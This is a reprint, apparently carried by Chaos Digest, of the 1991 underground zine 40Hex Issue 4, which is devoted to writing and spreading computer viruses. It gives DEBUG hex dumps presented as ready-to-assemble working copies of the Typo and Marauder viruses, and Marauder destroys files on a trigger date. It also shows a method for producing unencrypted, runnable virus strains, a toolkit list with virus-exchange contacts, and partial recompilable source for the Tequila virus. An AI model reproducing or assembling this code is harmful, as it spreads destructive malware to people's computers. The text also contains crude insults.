diskettes.  On average, computers involved in a virus disaster were out
of commision four days and required reprogramming at a cost of $6,200.

   And, in 3 percent of virus attacks, either the person who introduced
the virus or the person responible for computer security was threatened
with dismmisal.  Dataquest didn't count how many were actually fired.

   "Computer viruses are much more prevalent than people think and,
unless we think, and unless we take precautions, over time they are
going to get worse," said Andrew Seybold, head of the Dataquest servey team.

   But anti-virus software and strict enforcement of computer scurity
policies could change in the future.

   "The good news is, it's solveable.  The bad news is companies aren't
chossing to solve it,", Cotter concluded.  ** The other way around for us **

+++++

40Hex Issue 4                                            December 1991

                         The Typo COM Virus

     The Typo Virus comes in 2 forms - a boot sector infector, and a
COM file infector.  This version is the COM version.  The effective
length of the virus is 867 bytes, and it only infects COM files.  Typo
stays resident, and can infect files whether they are run or not, from my
experience.  Typo isn't a destructive virus, but it does garble any
output to the parallel ports, by exchanging certain letters with others
that sound similar, and by transposing numbers.  Sometimes it replaces
one number with an entirely different number.  Typo is believed to have
originated in Israel, because some Hebrew letters are changed when it is
active, and it was isolated in that country.  Typo is easily detected by
SCAN, and the scan string is "A1 58 00 2E 89 84 99 FE 26 A1 5A 00" in lines
400 and 410 of the hex dump, below.

To assemble TYPO.COM, cut out the following hex, and name the resulting
file TYPO.  Then, issue the command DEBUG < TYPO and you will have a
working version of the virus.

--DecimatoR

----------------------------Cut Here------------------------------
n typo.com
e 0100  E9 18 00 31 E9 FF FF 2A 2E 43 4F 4D 00 CD 20 20
e 0110  56 31 05 00 CE CD 20 00 59 00 00 53 51 52 1E 06
e 0120  56 0E 1F E8 00 00 5E 83 EE 24 FF 4C 16 83 7C 16
e 0130  03 75 05 C7 44 16 5B 00 E8 85 02 BA D0 00 B4 1A
e 0140  CD 21 8A 44 0B 88 44 12 8B 44 0C 89 44 13 B4 2A
e 0150  CD 21 F6 C2 01 75 1F 8B D6 81 C2 05 00 33 C9 B4
e 0160  4E CD 21 72 11 E8 2C 00 8B D6 81 C2 05 00 33 C9
e 0170  B4 4F CD 21 73 EF 8A 44 12 A2 00 01 8B 44 13 A3
e 0180  01 01 BA 80 00 B4 1A CD 21 5E 07 1F 5A 59 5B B8
e 0190  00 01 FF E0 B8 01 43 BA EE 00 33 C9 CD 21 B8 02
e 01A0  3D BA EE 00 CD 21 73 03 E9 B4 00 89 44 10 8B D8
e 01B0  B4 3F B9 03 00 8B D6 81 C2 0B 00 CD 21 80 7C 0B
e 01C0  E9 75 30 8B 54 0C 83 EA 16 33 C9 B8 00 42 8B 5C
e 01D0  10 CD 21 8B D8 B4 3F B9 02 00 8B D6 81 C2 0E 00
e 01E0  8B 5C 10 CD 21 72 65 3D 00 00 74 07 8B 44 0E 3B
e 01F0  04 74 59 33 C9 33 D2 B8 02 42 8B 5C 10 CD 21 72
e 0200  4B 2D 03 00 89 44 03 8B 5C 10 B4 40 B9 63 03 90
e 0210  8B D6 81 C2 00 00 CD 21 72 32 83 44 03 19 33 D2
e 0220  33 C9 B8 00 42 8B 5C 10 CD 21 72 20 8B 5C 10 B4
e 0230  40 B9 03 00 8B D6 81 C2 02 00 CD 21 B8 01 57 8B
e 0240  5C 10 8B 0E E6 00 8B 16 E8 00 CD 21 8B 5C 10 B4
e 0250  3E CD 21 B8 01 43 BA EE 00 8A 0E E5 00 CD 21 C3
e 0260  FB 80 FC DD 75 03 8A C4 CF 80 FC 00 74 6C EA 2E
e 0270  E8 00 F0 C7 84 C7 84 59 00 60 31 32 33 34 35 36
e 0280  37 38 39 30 2D 3D 5C 7E 21 40 23 24 25 5E 26 2A
e 0290  28 29 5F 2B 7C 71 77 65 72 74 79 75 69 6F 70 5B
e 02A0  5D 5B 61 73 64 66 67 68 6A 6B 6C 3B 27 7A 78 63
e 02B0  76 62 6E 6D 2C 2E 2F 51 57 45 52 54 59 55 49 4F
e 02C0  50 7B 7D 41 53 44 46 47 48 4A 4B 4C 3A 22 3B 5A
e 02D0  58 43 56 42 4E 4D 3C 3E 3F 2E 56 E8 00 00 5E 9C
e 02E0  2E FF 5C 91 53 06 BB 40 00 8E C3 26 8B 1E 6C 00
e 02F0  53 2E 2B 5C 95 83 FB 02 5B 2E 89 5C 95 7F 39 2E
e 0300  87 5C 97 2E 2B 5C 97 F7 DB 2E 3B 5C 99 7C 29 2E
e 0310  FF 4C 99 2E 83 7C 99 06 74 06 2E C7 44 99 5B 00
e 0320  83 EE 65 51 B9 61 00 2E 3A 04 74 07 46 E2 F8 59
e 0330  EB 06 90 59 2E 8A 44 01 07 5B 5E CA 02 00 80 FC
e 0340  00 74 05 80 FC 4C 75 19 E8 24 00 2E 8B 16 2C 00
e 0350  8E C2 BB 00 00 B4 4A CD 21 BA 1D 00 83 C2 01 B4
e 0360  31 EA 60 14 73 02 B8 00 4C EB D3 3F 14 73 02 51
e 0370  57 56 06 E8 00 00 5E 56 BF 00 01 B9 DE 00 2E 8A
e 0380  84 EA FE 2E 88 05 46 47 E2 F4 5E 33 C9 8E C1 2E
e 0390  8B 4C EC 26 89 0E 84 00 2E 8B 4C EE 26 89 0E 86
e 03A0  00 2E 8B 4C F5 26 89 0E 80 00 2E 8B 4C F7 26 89
e 03B0  0E 82 00 B9 00 01 26 89 0E 58 00 07 5E 5F 59 C3
e 03C0  50 32 C0 B4 DD CD 16 3A C4 75 02 58 C3 53 56 06
e 03D0  8B 54 16 E8 00 00 5E 53 06 BB 40 00 8E C3 26 8B
e 03E0  1E 6C 00 2E 89 9C 9D FE 2E 89 9C 9F FE 07 5B 89
e 03F0  94 A1 FE 33 C0 8E C0 26 A1 84 00 2E 89 44 8C 26
e 0400  A1 86 00 2E 89 44 8E 26 A1 58 00 2E 89 84 99 FE
e 0410  26 A1 5A 00 2E 89 84 9B FE 26 A1 80 00 2E 89 44
e 0420  95 26 A1 82 00 2E 89 44 97 FA 0E 26 8F 06 86 00
e 0430  26 89 36 84 00 26 81 2E 84 00 98 00 0E 26 8F 06
e 0440  82 00 26 89 36 80 00 26 83 2E 80 00 70 0E 26 8F
e 0450  06 5A 00 26 89 36 58 00 26 81 2E 58 00 76 01 FB
e 0460  07 5E 5B 58 C3 1A 1A 1A 1A 1A 1A 1A 1A 1A 1A 1A
rcx
464
w
q
--------------------------Cut Here Too-----------------------------

Notice to all: 40Hex is always looking for new viruses to do write ups
on, and new source code to distribute.  If you have a copy of a rare
virus, and/or viral source code, please send it to Digital Warfare BBS,
at 717-367-3501.  We'll be happy to give you the credit for donating it -
IF you want us to.  ;)

--Dec

+++++

40Hex Issue 4                                            December 1991


                       How Lame Are These People?
                       ++++++++++++++++++++++++++

This text is from the Homebase BBS, Mcaffee's board, all I can say is
read it.  Special apperance from Data Distruptor of Rabid and
Lestat/Skism, AKA me... Read on...


Msg#: 5712 *viru*
11-19-91 17:11:34
From: TERRY ROSS
  To: ALL
Subj: IS THIS A VIRUS?
Hi.  Is there a known virus which displays a screen which reads "INC, for
quality cracks?"  I have recently inherited a computer at the company I work
at and there was apparently some tetris and blockout games on the disk which
are the source of this message.  I found a file called "runme.bat" with the
text in it, but even after I deleted it, it still pops up the aforementioned
message.  Also, the message gives me a choice of EGA CGA or monochrome and in
general, the message makes life difficult for me.
        any help with this would be vastly appreciated.

<*>Replies
gain, eply, ext, or top?


Msg has replies, read now(Y/N)? y


Msg#: 5715 *viru*
11-19-91 17:50:59
From: ARYEH GORETSKY
  To: TERRY ROSS
Subj: REPLY TO MSG# 5712 (IS THIS A VIRUS?)
If you can upload a copy of an infected file, we can see if it contains viral
code.

Aryeh Goretsky
 Tech Support

<->, gain, eply, ext, or top? N

-- The below text was deleted by Aryeh, I don't think he likes me --

Msg#: 5718 *viru*
11-19-91 19:42:34
From: LESTAT /SKISM
  To: TERRY ROSS
Subj: REPLY TO MSG# 5712 (IS THIS A VIRUS?)
It's not a virus.  INC is the International Network of Crackers.  What they do
is unprotect games and distribute them.  What you do have is most likely
illegally obtained software.

<->, elete, gain, eply, ext, or top?


End of Replies, add yours(Y/N)? N


Msg#: 5717 *viru*
11-19-91 18:01:25
From: DATA DISRUPTOR
  To: ARYEH GORETSKY
Subj: REPLY TO MSG# 5597 (RABID)
 Haha! Funny guy. I believe you are referring to the Roland D-10 and S-10
series of keyboards... R-10 being a keyboard... bah!

Data Disruptor RABID Int'nl Development Corp.

<*>Replies
<->, gain, eply, ext, or top?


Msg has replies, read now(Y/N)? y


-- Again I was deleted, come on Aryeh old buddy --

Msg#: 5719 *viru*
11-19-91 19:45:03
From: LESTAT /SKISM
  To: DATA DISRUPTOR
Subj: REPLY TO MSG# 5717 (RABID)
Thats coming from a guy who thinks INC are virus writers.  Jessh.

<->, elete, gain, eply, ext, or top?


End of Replies, add yours(Y/N)? N

+++++

40Hex Issue 4                                            December 1991

"I take my boys everywhere I go, cause I'm paranoid..."

                           The Marauder Virus
                           ++++++++++++++++++


    December marks the first year of the group Skism.  The alliance of
    Phalcon/Skism took place around July 1991.  Me and a few freinds at
    school started the group by hacking old viruses into new strains.
    Well I have lost contact with these people since then and a new
    breed of members has risen from the ashes.

    Well, I myself have learned a lot over the year.  I went from virus
    hacker with about three viruses to my name, to overwritting man,
    to what I am now.  An advanced (kind of) level assembler programmer,
    writing parasitic infectors.  Well come this time next year I belive
    I'll be into more major stuff, ya know sick mother fucking DIR-2
    type action.  I've written a couple of TSR viruses shells, nothing
    completed yet.  Well anyway here's my personal latest creation -
    Marauder.  What Marauder is, is this ----

Marauder Virus
By Hellraiser
of Phalcon/Skism

Aliases: Deadpool-B, 808-B, 860.

Marauder is a non-overwriting, non-resident, encrypting, semi-mutating,
.COM file infector.

When a file is infected with the Marauder Virus the virus will search
the current path for a .COM file and infect it, adding 860 bytes to the
files size.  If not .COM files reside in the current directory, the
virus will go up one directory and check for .COM files to infect untill
it reaches the root.  At the root directory the virus will scan for
other directorys to find .COM files, until one uninfected .COM file is
found.  If no .COM files are found on the disk the virus will terminate
it search and return to the currently running program.

If an infected file is run on Feburary second of any year, the virus
will destroys all files in the current directory, by overwritting them
with message code.  The files will not run when executed, just terminate
upon reading the first line.  There is no way to recover the files once
the virus destroys them.  After this control will be given back to the
host program.

The Maruder virus is able to infect any .COM file no matter what
attribute... Hidden, System, Read-Only, etc... The files date, time, and
attribute will not be changed after a file becomes infected.

The virus will not cause a system error if run on a write-protected
floppy or fixed-disk, merely terminate any attempt of infection.

The virus will not infect files under 16 bytes or over 64,675 bytes.

For the most part the virus is randomly encrypted with each passing
infection, the small part of the program code which is not encrypted
mutates between two different, but comaptable strain of bytes.

There is not way of detecting the virus infections other than the
addition of 860 bytes to infected files, in other words, system-run time
is not affected at all.  If any run-time is affected it is the split
second it takes for the virus to infect a file.

The virus causes no damage to disk sectors or boot records etc... The
only perminate damage is the destuction of all files in the current
directory on 02/02/XX.

And here it is...

-------------------------------------------------------------------------
n target.com
e 0100  E9 61 00 88 68 69 73 20 66 69 6C 65 20 69 73 20
e 0110  69 6E 66 65 63 74 65 64 20 77 69 74 68 20 74 68
e 0120  65 20 4D 61 72 61 75 64 65 72 20 76 69 72 75 73
e 0130  2E 20 31 39 39 32 2C 20 48 65 6C 6C 72 61 69 73
e 0140  65 72 20 50 68 61 6C 63 6F 6E 2F 53 6B 69 73 6D
e 0150  2E 0D 0A 24 20 20 20 20 20 20 20 B4 09 BA 03 01
e 0160  CD 21 CD 20 E8 00 00 5E 81 EE 0E 01 E8 05 00 E9
e 0170  85 00 3A 28 8B EE 81 C6 65 04 8B FE 50 53 51 52
e 0180  B9 8F 01 FD AD 33 86 19 01 AB E2 F8 5A 59 5B 58
e 0190  8B F5 C3 E8 DE FF CD 21 E8 D9 FF C3 7A 6B 7B 6A
e 01A0  91 B5 13 99 FC 93 D4 51 13 99 EC EE 99 E7 4A 49
e 01B0  4B 48 99 FC 93 D4 77 16 99 EC 42 41 43 40 AB 9D
e 01C0  13 EF 48 4B 49 4A 99 E7 DF 32 32 49 5F 73 60 73
e 01D0  67 76 77 60 4F 32 23 2B 2B 20 32 5A 77 7E 7E 60
e 01E0  73 7B 61 77 60 32 3F 32 42 7A 73 7E 71 7D 7C 3D
e 01F0  41 79 7B 61 7F 3C 1A 2E 82 0C 0F E5 1B A1 A6 76
e 0200  3E A4 BE 48 3E 2F 82 0C 1F A5 AE 4A 3E E5 1B 7E
e 0210  8E 6F 08 FA BB EE EC 2C F7 09 64 9C 23 E5 1B 2C
e 0220  7B A0 BE FB 3E 90 00 74 B3 AC EE 2C 6C 75 B7 9E
e 0230  75 2C B7 96 69 2C 83 2C 3A D4 C9 8C 6F 76 8E 32
e 0240  B7 BC 55 2C F7 09 8E 02 F7 09 BB D2 38 2A 4F 2B
e 0250  D3 96 3B 9C 74 A5 AE 10 3E 91 3D 28 F7 09 49 6C
e 0260  8E 32 B7 BC 22 2D F7 09 8E 13 B7 BC 78 2C F7 09
e 0270  48 2A D1 E2 BA 94 67 2C 3B 5C 23 98 3B A0 BE 75
e 0280  3E 9C 74 1B F3 99 29 A5 AE 16 3E E5 1B 5B 33 C1
e 0290  69 29 AA B8 8E 67 D1 DB 8E 13 B7 BC 0C 2D F7 09
e 02A0  48 DA D1 B2 B1 B4 BE 2C B3 B4 71 2C 82 29 79 1B
e 02B0  F3 A5 AE A5 3E E5 1B 5A 05 C0 A0 29 48 12 B3 AC
e 02C0  76 2C B1 B4 BD 2C B3 B4 7D 2C B1 B4 BF 2C B3 B4
e 02D0  73 2C A9 9C 05 91 3E 28 B7 BC 75 2C F7 09 BA 94
e 02E0  68 2C B2 5D 1F 90 3B 6B B1 A4 71 2C B7 BC B7 2C
e 02F0  08 C5 F7 09 8E 16 F7 09 07 2D 3A 5C 30 15 38 28
e 0300  4E 2D 8E 67 D3 7D C5 C1 E1 28 BB 94 75 2C 77 72
e 0310  4E FB D2 1F 3B 15 2A 28 48 E3 07 B7 C6 5B FC 05
e 0320  39 28 B2 8C 63 2C B2 AC 62 2C FC AC 60 2C B2 B8
e 0330  8E C1 B2 8C 6D 2C 08 E8 B2 AC 67 2C C5 AC 7F 2C
e 0340  B1 C6 D2 CF 3A 9C 16 E5 1B AB C0 28 4E DF B3 BC
e 0350  23 29 8B 20 E9 E2 B3 BC 61 2C BA D2 24 56 39 C3
e 0360  1A B8 B7 9E 79 29 B7 96 21 29 83 38 3A C0 82 28
e 0370  B7 9E 69 29 B7 96 09 29 83 2E 3A C0 90 28 D1 35
e 0380  AA A5 8C 71 3B A5 84 33 3B 91 2A 28 D2 B1 3A A5
e 0390  8C 41 3B A5 84 1B 3B 91 3C 28 D2 A3 3A C0 B6 28
e 03A0  B1 DD 8E 68 83 7F 39 AB FB 2D B7 BC 31 29 D2 CA
e 03B0  C7 5A 34 C0 B6 28 8E 68 83 2C 3A A5 AE 7F 3E E5
e 03C0  1B 90 3B 7F B1 A4 73 2C B1 BC 7D 2C B1 B4 76 2C
e 03D0  F7 09 8E 16 F7 09 82 29 79 A3 B6 63 3E A5 AE A5
e 03E0  3E 1A D7 E5 1B 9C 01 A5 AE FB 3E E5 1B 9C 20 92
e 03F0  BA 28 F7 09 6C 75 82 0C 1F A5 AE 76 3E E5 1B A5
e 0400  8C 7B 3E 97 3A 29 83 2C 3A D4 C9 8C 85 28 3B D7
e 0410  DD C0 22 28 8E 66 83 2F 3A A5 AE 16 3E E5 1B 5A
e 0420  F6 C0 06 28 8E 67 D1 DD C6 DB 9E EB B1 DD BB EE
e 0430  79 29 B1 D6 83 05 3A 85 09 AE 61 2C 91 CA C2 A3
e 0440  CF EB 82 28 78 1B F3 1B E8 E5 1B EB 82 2A 78 1B
e 0450  E8 1B F3 E5 1B EB 82 2A 07 A5 AE A5 3E E5 1B EB
e 0460  D2 DB C5 5A 11 A3 E2 7B D2 C9 C5 93 15 28 CD DB
e 0470  B1 E0 61 79 D2 E3 C5 71 6B 9C 7A 91 15 28 B7 BC
e 0480  55 29 F7 09 48 2E 63 61 D9 2A D1 C4 8E 16 F7 09
e 0490  F9 02 14 6B 75 65 3A 02 14 02 3A 06 14 28 3B 28
e 04A0  A2 3F 36 9E 1A 2D 3A 28 D1 71 AA 7C 33 E5 1A B8
e 04B0  D3 49 3A A0 12 12 3A 7E 3B 99 24 1A FA E7 B4 2E
rcx
03C0
w
q

------------------------------

End of Chaos Digest #1.42
************************************

Chaos Digest              Mercredi 2 Juin 1993        Volume 1 : Numero 43
                             ISSN 1244-4901

       Editeur: Jean-Bernard Condat (jbcondat@attmail.com)
       Archiviste: Yves-Marie Crabbe
       Co-Redacteurs: Arnaud Bigare, Stephane Briere

TABLE DES MATIERES, #1.43 (2 Juin 1993)
File 1--40H VMag Issue 1 Volume 4 #009-012(1) (reprint)

Chaos Digest is a weekly electronic journal/newsletter. Subscriptions are
available at no cost by sending a message to:
                linux-activists-request@niksula.hut.fi
with a mail header or first line containing the following informations:
                    X-Mn-Admin: join CHAOS_DIGEST

The editors may be contacted by voice (+33 1 47874083), fax (+33 1 47877070)
or S-mail at: Jean-Bernard Condat, Chaos Computer Club France [CCCF], B.P.
155, 93404 St-Ouen Cedex, France.  He is a member of the EICAR and EFF (#1299)
groups.

Issues of ChaosD can also be found from the ComNet in Luxembourg BBS (+352)
466893.  Back issues of ChaosD can be found on the Internet as part of the
Computer underground Digest archives. They're accessible using anonymous FTP:

        * kragar.eff.org [192.88.144.4] in /pub/cud/chaos
        * uglymouse.css.itd.umich.edu [141.211.182.53] in /pub/CuD/chaos
        * halcyon.com [192.135.191.2] in /pub/mirror/cud/chaos
        * ftp.cic.net [192.131.22.2] in /e-serials/alphabetic/c/chaos-digest
        * cs.ubc.ca [137.82.8.5] in /mirror3/EFF/cud/chaos
        * ftp.ee.mu.oz.au [128.250.77.2] in /pub/text/CuD/chaos
        * nic.funet.fi [128.214.6.100] in /pub/doc/cud/chaos
        * orchid.csv.warwick.ac.uk [137.205.192.5] in /pub/cud/chaos

CHAOS DIGEST is an open forum dedicated to sharing French information among
computerists and to the presentation and debate of diverse views. ChaosD
material may be reprinted for non-profit as long as the source is cited.
Some authors do copyright their material, and they should be contacted for
reprint permission.  Readers are encouraged to submit reasoned articles in
French, English or German languages relating to computer culture and
telecommunications.  Articles are preferred to short responses.  Please
avoid quoting previous posts unless absolutely necessary.

DISCLAIMER: The views represented herein do not necessarily represent
            the views of the moderators. Chaos Digest contributors
            assume all responsibility for ensuring that articles
            submitted do not violate copyright protections.

----------------------------------------------------------------------

Date: Tue May 11 09:24:40 PDT 1993
From: 0005847161@mcimail.com (American_Eagle_Publication_Inc. )
Subject: File 1--40H VMag Issue 1 Volume 4 #009-012(1) (reprint)


40Hex Issue 4                                            December 1991

                      Hacked Pklite File Scanning
                      +++++++++++++++++++++++++++

   In issue two, i belive it was.  I release a method of making Pklite
   files un-uncompressable and un-detectable.  Well seems a few people
   used the trick for wrong doing.  What do I mean by wrong doing you
   ask?  Well lets just say lame trojans and such.

   Anyway, I had a few sysops on my ass about the trick and so, so now I
   am must release.... The hacked Pklite scanning strings.   Well I
   could really give a fuck if someones BBS gets crashed, but then again
   I am freinds with a lot of sysops.  And besides I have a new trick
   anyway :)

   Well there are two strings.  One for .EXE files and one for .COM
   files.  And here they are.

+----------------------------------------------------------------------

   "01 F0 FF 50 00 00 00 03 01" Pklite EXE
   "53 33 DB 53 CB 03 01"       Pklite COM

+----------------------------------------------------------------------

What's my new trick???  Well I won't reveal it at this point... But here
is a another compression trick.  It lets you compress a file with Pklite
then again with LZExe.

First
+----

Compress the file with Pklite

Next
+---

Compress the file with LZExe

It wont let you cause the file becomes bigger...

But
+--

Use the DOS Undelete function to undelete the file ?zexe.tmp.  Thats the
twice compressed file.  Rename it to what you want.  Destroy the LZ
header... And there you have it...

+++++

40Hex Issue 4                                            December 1991

             A Further Look Into Cracking Encrypted Virues
             +++++++++++++++++++++++++++++++++++++++++++++


In Censor #1, Rabids' Data Disruptor showed a way to decrypt
encrypted viruses.  The only problem with the method shown is that
once you decrypt the virus, it cannot be run without modification.
I wish to take his theory a little farther, with a different approch.

There is a really simple way around the problem.  What you will
need is a debugger.  I perfer Turbo Debugger, by Borland.  However
if you are good at the DOS utility Debug, you may be able to follow along.

The routine to unencrypt is simple, really simple.  What you will
need to do is make a small target file for the virus to infect.  A
100 byte of less file is perfered.

Step One
+-------

Copy the target file to a different filename to make two copies of
the file.  Example - COPY TARGET.COM DUDE.COM

Step Two
+-------

Infect one of the files, however the virus infectes the file.
Remember just infect one of the files.

Step Three
+---------

Load up you dubugger (I'm gonna give Turbo Debugger steps, so people
with Debug and the Microsoft Debugger will have to improvise) and
get ready to single step through the virus.

Step Four
+--------

Start single stepping through the virus.  If the virus is encrypted
you will hit a loop somwhere near the beginning of the code.   In
most cases this is an XOR loop.  It will look something like this...

add si, [1234]
mov di, si
mov cx, 0123      ;this would be the virus size to unencrypt
mov al, [0105]    ;this is the encryption value's offset or the
                  ;actual encryption value if no brackets are
                  ;around it
cli               ;auto increment
lodsb             ;load byte from si position
xor ah, al        ;xor byte at si
stosb             ;store it a di (same as si)
loop 0110         ;loop until cx=0 NOTE: 0110 will be an offset
ret               ;return when done

Where the "*" is, will be either the location of the encryption
value, or the actual encryption value if no brackets are around it.
If there are no brackets, keep that number in mind.  Otherwise write
the offset down.

Step Five
+--------

When the encryption procedure is done the virus is then unencrypted.
If you were to write the virus to disk now, it would not run.  Cause
as soon as the virus runs it encrypts itself and then jumps into the
encrypted code.

Follow the program to the part where the virus is about to write the
virus to the host program.  It will again call on the encryption
routine.

Here it is again, but this time, before it XORs anything load the
encryption value with 0's.  If it is a bytes value load it with 00,
if it is a word value load it with 0000 as in...


add si, [1234]
mov di, si
mov cx, 0123      ;this would be the virus size to unencrypt
mov al, 00        ;change the encryption value to zero, thus the
                  ;encryption will not take place at all.  Instead
                  ;the virus will produce an original strain.
cli               ;auto increment
lodsb             ;load byte from si position
xor ah, al        ;xor byte at si
stosb             ;store it a di (same as si)
loop 0110         ;loop until cx=0 NOTE: 0110 will be an offset
ret               ;return when done

Now run the program at full speed.  The next file the virus infects
will be unencrypted, and executable.

NOTE: This method will work only for the types of viruses that use
this type of encryption.  Mainly non-resident .COM and .EXE
infectors.  In other words, don't go thinking this trick will work
on Whale or anything.

+++++

40Hex Issue 4                                            December 1991

                 The Ultimate Virus Programmers Toolkit
                 ++++++++++++++++++++++++++++++++++++++

Just thought it would be funny to list what I think is the ulitmate virus
programmers toolkit.  Theroys may vary.

- Turbo Assembler (MASM sucks, and it is slow)
- Turbo Debugger (It rules, what else can I say?)
- Quick Edit (Small, Fast and Turbo-like keys)
- Sourcer 486 (The ONLY real dissembler out)
- Virus Scan by McAffe Asst. (It really is a great tool)
- VSUM (Patti Hoffman is a stupid bitch, but I must admit, this
        program is the virus underground bible)
- VSAFE from Central Point Anti-Virus (Not as annoying as Flu-Shot)
- Pklite Proffesional (If you don't have it - get it)
- Norton 6.0 (Diskedit alone is worth the d/l time)
- Pc-Backup by Central Point (we all fuck up sooner or later)
- MEMWALK.EXE (great shareware program, like diskedit for memory)
- Teledisk (for boot block virus saves)
- Trunc - by Skism Programming (Electronic file shredder)
- Microsoft Press Quick Reference Series
           - DOS Functions  (INT 20 - 26)
           - ROM and BIOS functions (INT 10, 15 - 16)
           - MS DOS extentions (Expaned, extended memory interupts)
- _Undocumented DOS_ or any current text file on the subject-
- 40HEX magazine (Well I do have good stuff here, sometimes)
- Dark Angel's Phunky Virus writing guide (pretty hard to come by.
                                           He expalins stuff well)
- The following source code
           - Leprosy-B (beginers only on this one, none-the-less)
           - Cancer (well documented, intermediate)
           - Tiny-F (not bad intro to .COM infections)
           - Dark Avenger (well availible and excellent tips on .EXE
                           infection)
           - Stoned II (boot block intro)
           - Secure 2.0 (I got the source to this.  It is a virus
                         detection system from the guy who wrote
                         1260, Mark Washburn.  The source has some
                         great examples on debug trapping, TSR
                         skills, and encryption)
           - IBM Scan source (I have this too, it's funny... Kinda
                              like McAfee's SCAN but lamer.  By
                              David Chess)
- An account on the Bulgerian Virus Exchange +359-220-4198
- An account on a BBS with Fido-Nets' virus echo (keep track of your
                                                 latest score)
- Many accounts on the Homebase BBS (408) 988-4004 2400 bps
                                    (408) 988-5138 HST 9600
                                    (408) 988-5190 v32 9600
  (Tell Areyh I sent ya')
- Scientific Calculator (Hex aint easy)
- Vivaren (Helps you break night, or any other controlled substance)
- Food, smokes, or whatever your vice is...


That'll do it...

+++++

40Hex Issue 4                                            December 1991

                       The Tequila Virus Source
                       ++++++++++++++++++++++++

    Nuff' said.

----------------------------------------------------------------------------
                   ;=============================
                   ;      the tequila virus     =
                   ;        a recompilable      =
                   ;         dis-assembly       =
                   ;    specifically designed   =
                   ; for assembly to a COM file =
                   ;  with the A86 assembler.   =
                   ;     ++++++++++++++++++     =
                   ; If you desire a "perfect"  =
                   ; byte for byte source code  =
                   ;match-up, the MASM assembler=
                   ; must be used and the noted =
                   ;instructions must be changed=
                   ; to comply with MASM syntax.=
                   ; In addition, all byte and  =
                   ;word pointer references must=
                   ; be changed from B and W to =
                   ;   BYTE POINTER and WORD    =
                   ;          POINTER.          =
                   ;=============================


CODE_SEG   SEGMENT
ASSUME CS:CODE_SEG, DS:CODE_SEG, ES:CODE_SEG, SS:CODE_SEG
ORG 0100
TEQUILA PROC NEAR

JMP START

  DB 000, 000, 000, 000, 000, 000, 000, 0FFH, 0FFH
  DB 009, 005, 001H, 010H, 000, 000, 002H, 0FAH, 000, 00CH

  DB 00DH, 00AH, 00DH, 00AH
  DB "Welcome to T.TEQUILA's latest production.", 00DH, 00AH
  DB "Contact T.TEQUILA/P.o.Box 543/6312 St'hausen/"
  DB "Switzerland.", 00DH, 00AH
  DB "Loving thoughts to L.I.N.D.A", 00DH, 00AH, 00DH, 00AH
  DB "BEER and TEQUILA forever !", 00DH, 00AH, 00DH, 00AH
  DB "$"

  DB "Execute: mov ax, FE03 / int 21. Key to go on!"


PROGRAM_TERMINATION_ROUTINE:
   PUSH BP
   MOV BP,SP
   SUB SP,0CH
   PUSH AX
   PUSH BX
   PUSH CX
   PUSH DX
   PUSH SI
   PUSH DI
   PUSH ES
   PUSH DS
   PUSH CS
   POP DS
   MOV AX,W[6]
   INC AX
   JE 0243H            ;Masm Mod. Needed
   DEC AX
   JNE 020DH           ;Masm Mod. Needed
   DEC W[8]            ;Masm Mod. Needed
   JNE 0243H           ;Masm Mod. Needed
   JMP 0246H           ;Masm Mod. Needed
   MOV AH,02AH
   CALL INT_21
   MOV SI,CX
   MOV CX,W[8]
   CMP CL,DL
   JNE 022FH           ;Masm Mod. Needed
   MOV AX,SI
   SUB AX,W[6]
   MUL B[011H]         ;Masm Mod. Needed
   ADD AL,DH
   ADD CH,3
   CMP AL,CH
   JAE 0237H           ;Masm Mod. Needed
   MOV W[6],0FFFFH     ;Masm Mod. Needed
   JMP 0243H           ;Masm Mod. Needed
   MOV W[6],0          ;Masm Mod. Needed
   MOV W[8],3          ;Masm Mod. Needed
   JMP 02DF            ;Masm Mod. Needed
   MOV BX,0B800H
   INT 011
   AND AX,030H
   CMP AX,030H
   JNE 0256H           ;Masm Mod. Needed
   MOV BX,0B000H
   MOV ES,BX
   XOR BX,BX
   MOV DI,0FD8FH
   MOV SI,0FC18H
   MOV W[BP-2],SI
   MOV W[BP-4],DI
   MOV CX,01E
   MOV AX,W[BP-2]
   IMUL AX
   MOV W[BP-8],AX
   MOV W[BP-6],DX
   MOV AX,W[BP-4]
   IMUL AX
   MOV W[BP-0C],AX
   MOV W[BP-0A],DX
   ADD AX,W[BP-8]
   ADC DX,W[BP-6]
   CMP DX,0F
   JAE 02B0            ;Masm Mod. Needed
   MOV AX,W[BP-2]
   IMUL W[BP-4]
   IDIV W[0F]          ;Masm Mod. Needed
   ADD AX,DI
   MOV W[BP-4],AX
   MOV AX,W[BP-8]
   MOV DX,W[BP-6]
   SUB AX,W[BP-0C]
   SBB DX,W[BP-0A]
   IDIV W[0D]          ;Masm Mod. Needed
   ADD AX,SI
   MOV W[BP-2],AX
   LOOP 0269           ;Masm Mod. Needed
   INC CX
   SHR CL,1
   MOV CH,CL
   MOV CL,0DB
   ES MOV W[BX],CX     ;Masm Mod. Needed
   INC BX
   INC BX
   ADD SI,012
   CMP SI,01B8
   JL 0260             ;Masm Mod. Needed
   ADD DI,034
   CMP DI,02A3
   JL 025D             ;Masm Mod. Needed
   XOR DI,DI
   MOV SI,0BB
   MOV CX,02D
   CLD
   MOVSB
   INC DI
   LOOP 02D7           ;Masm Mod. Needed
   XOR AX,AX
   INT 016
   POP DS
   POP ES
   POP DI
   POP SI
   POP DX
   POP CX
   POP BX
   POP AX
   MOV SP,BP
   POP BP
   RET

PRINT_MESSAGE:
   PUSH DX
   PUSH DS
   PUSH CS
   POP DS
   MOV AH,9
   MOV DX,012
   CALL INT_21
   POP DS
   POP DX
   RET

NEW_PARTITION_TABLE:
   CLI
   XOR BX,BX
   MOV DS,BX
   MOV SS,BX
   MOV SP,07C00
   STI
   XOR DI,DI
   SUB W[0413],3            ;Masm Mod. Needed
   INT 012
   MOV CL,6
   SHL AX,CL
   MOV ES,AX
   PUSH ES
   MOV AX,022A
   PUSH AX
   MOV AX,0205
   MOV CX,W[07C30]
   INC CX
   MOV DX,W[07C32]
   INT 013
   RETF

DB 002, 0FE
DB 04C, 0E9
DB 080, 004

   PUSH CS
   POP DS
   XOR AX,AX
   MOV ES,AX
   MOV BX,07C00
   PUSH ES
   PUSH BX
   MOV AX,0201
   MOV CX,W[0226]
   MOV DX,W[0228]
   INT 013
   PUSH CS
   POP ES
   CLD
   MOV SI,0409
   MOV DI,09BE
   MOV CX,046
   REP MOVSB
   MOV SI,091B
   MOV DI,0A04
   MOV CX,045
   REP MOVSB
   CLI
   XOR AX,AX
   MOV ES,AX
   ES LES BX,[070]           ;Masm Mod. Needed
